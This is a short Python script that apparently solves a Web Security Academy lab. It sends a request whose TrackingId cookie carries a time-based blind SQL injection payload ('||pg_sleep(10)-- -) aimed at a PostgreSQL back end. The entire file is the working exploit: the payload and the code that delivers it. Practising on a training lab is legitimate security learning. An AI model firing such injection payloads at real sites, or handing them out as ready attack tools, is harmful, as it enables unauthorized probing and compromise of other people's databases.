import requests

URL = "https://0a64009c035ff1f389cc197600120078.web-security-academy.net/"
session = requests.Session()
cookie = {
    "TrackingId": ""
}
PAYLOAD = "'||pg_sleep(10)-- -"

cookie["TrackingId"] = PAYLOAD
session.get(URL, cookies=cookie)